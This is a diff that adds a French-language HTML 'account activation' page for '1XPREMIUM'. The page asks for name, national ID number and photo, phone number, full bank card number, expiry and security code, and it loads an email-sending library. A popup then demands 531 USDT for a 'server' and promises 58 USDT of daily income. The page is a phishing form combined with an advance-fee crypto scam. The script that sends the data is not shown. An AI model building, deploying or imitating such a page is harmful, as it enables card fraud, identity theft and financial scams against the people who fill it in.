@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Activation de compte - 1XPREMIUM</title>
+    <link rel="stylesheet" href="style.css">
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+</head>
+<body class="form-page">
+    <div class="container">
+        <div class="form-container">
+            <h2>Formulaire d'Activation</h2>
+            
+            <form id="activationForm">
+                <div class="form-row">
+                    <div class="form-group">
+                        <label for="lastName">Nom</label>
+                        <input type="text" id="lastName" name="lastName" required>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="firstName">Prénom</label>
+                        <input type="text" id="firstName" name="firstName" required>
+                    </div>
+                </div>
+                
+                <div class="form-row">
+                    <div class="form-group">
+                        <label for="age">Âge</label>
+                        <input type="number" id="age" name="age" min="18" required>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="profession">Profession</label>
+                        <input type="text" id="profession" name="profession" required>
+                    </div>
+                </div>
+                
+                <div class="form-row">
+                    <div class="form-group">
+                        <label for="idNumber">Numéro de carte d'identité</label>
+                        <input type="text" id="idNumber" name="idNumber" required>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="phone">Numéro de téléphone</label>
+                        <input type="tel" id="phone" name="phone" required>
+                    </div>
+                </div>
+                
+                <div class="form-row">
+                    <div class="form-group">
+                        <label for="cardNumber">Numéro de carte bancaire</label>
+                        <input type="text" id="cardNumber" name="cardNumber" required>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="expiryDate">Date d'expiration (MM/AA)</label>
+                        <input type="text" id="expiryDate" name="expiryDate" placeholder="MM/AA" required>
+                    </div>
+                </div>
+                
+                <div class="form-row">
+                    <div class="form-group">
+                        <label for="cvs">CVS (3 chiffres)</label>
+                        <input type="text" id="cvs" name="cvs" maxlength="3" required>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="idExpiry">Date d'expiration de la carte d'identité</label>
+                        <input type="date" id="idExpiry" name="idExpiry" required>
+                    </div>
+                </div>
+                
+                <div class="form-group">
+                    <label for="idPhoto">Photo de la carte d'identité</label>
+                    <input type="file" id="idPhoto" name="idPhoto" accept="image/*" required>
+                </div>
+                
+                <button type="submit" class="btn btn-submit">Validée</button>
+            </form>
+        </div>
+    </div>
+    
+    <!-- Popup après validation -->
+    <div id="postActivationPopup" class="popup hidden">
+        <div class="popup-content liquid-glass scrollable">
+            <div class="popup-header">
+                <h3>Information importante</h3>
+            </div>
+            <div class="popup-body">
+                <p>Suite à l'achat du logiciel GNSI, nous vous informons que l'activation complète de votre compte nécessite l'intégration d'un serveur OSJL de niveau Bronze, indispensable au bon fonctionnement du système.</p>
+                <p>Le coût de ce serveur est de 531 USDT.</p>
+                <p>Une fois cette étape validée, vous bénéficierez automatiquement d'un revenu quotidien de 58 USDT crédité sur votre compte 1xPremium, selon les conditions du programme.</p>
+                <p>Nous restons disponibles pour vous accompagner dans chaque étape de l'activation.</p>
+            </div>
+            <div class="popup-footer">
+                <button class="btn btn-accept" onclick="acceptServerIntegration()">J'accepte</button>
+            </div>
+        </div>
+    </div>
+    
+    <script src="app.js"></script>
+</body>
+</html>
